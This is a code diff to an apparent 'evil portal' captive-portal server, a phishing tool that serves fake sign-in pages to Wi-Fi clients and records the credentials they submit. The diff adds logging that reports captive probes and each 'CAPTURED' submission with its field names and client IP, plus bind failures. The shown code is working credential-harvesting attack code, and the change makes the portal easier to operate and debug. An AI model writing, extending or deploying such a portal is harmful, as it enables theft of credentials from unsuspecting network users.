@@ -154,6 +154,16 @@ def format_creds(creds):
 
 # --- stdlib serving adapter (not unit-tested; the logic above is) -----------
 
+def _elog(msg):  # pragma: no cover - stderr goes to the unit's journal
+    """Log a portal line to stderr so ``journalctl -u kestrel-evil-portal`` shows
+    what each client did -- which request reached the portal, and whether a
+    submission was captured. Without this the portal was a black box when a
+    client's captive sheet failed to appear."""
+    import sys
+    sys.stderr.write("evil-portal[http]: " + msg + "\n")
+    sys.stderr.flush()
+
+
 def serve(template_dir, creds_path, host="0.0.0.0", port=80):  # pragma: no cover
     """Run the portal until interrupted. All request logic goes through
     :func:`route`; this only adapts http.server to it and records creds."""
@@ -174,31 +184,45 @@ def serve(template_dir, creds_path, host="0.0.0.0", port=80):  # pragma: no cove
     class Handler(BaseHTTPRequestHandler):
         protocol_version = "HTTP/1.1"
 
-        def log_message(self, *a):  # quiet; journald would double-log
+        def log_message(self, *a):  # quiet; we log our own structured lines
             pass
 
         def _client(self):
             return self.client_address[0] if self.client_address else ""
 
         def do_GET(self):
-            resp = route("GET", self.path, {}, template_dir,
-                         self.headers.get("Host", ""))
-            _respond(self, resp)
+            hosth = self.headers.get("Host", "")
+            _elog("GET %s host=%s from=%s%s" % (
+                self.path, hosth, self._client(),
+                " (captive probe)" if is_probe_path(self.path, hosth) else ""))
+            _respond(self, route("GET", self.path, {}, template_dir, hosth))
 
         def do_POST(self):
+            hosth = self.headers.get("Host", "")
             length = int(self.headers.get("Content-Length") or 0)
             raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
             fields = {k: v[0] for k, v in parse_qs(raw).items()}
-            resp = route("POST", self.path, fields, template_dir,
-                         self.headers.get("Host", ""))
+            resp = route("POST", self.path, fields, template_dir, hosth)
             if resp.recorded:
                 try:
                     record_cred(creds_path, resp.recorded, self._client())
-                except OSError:
-                    pass
+                    _elog("POST %s from=%s CAPTURED %d field(s): %s" % (
+                        self.path, self._client(), len(resp.recorded),
+                        ",".join(sorted(resp.recorded))))
+                except OSError as exc:
+                    _elog("POST %s from=%s could not record: %s"
+                          % (self.path, self._client(), exc))
+            else:
+                _elog("POST %s host=%s from=%s (no fields)"
+                      % (self.path, hosth, self._client()))
             _respond(self, resp)
 
-    httpd = ThreadingHTTPServer((host, port), Handler)
+    try:
+        httpd = ThreadingHTTPServer((host, port), Handler)
+    except OSError as exc:
+        _elog("FAILED to bind %s:%s -- %s" % (host, port, exc))
+        raise
+    _elog("listening on %s:%s (templates: %s)" % (host, port, template_dir or "built-in"))
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
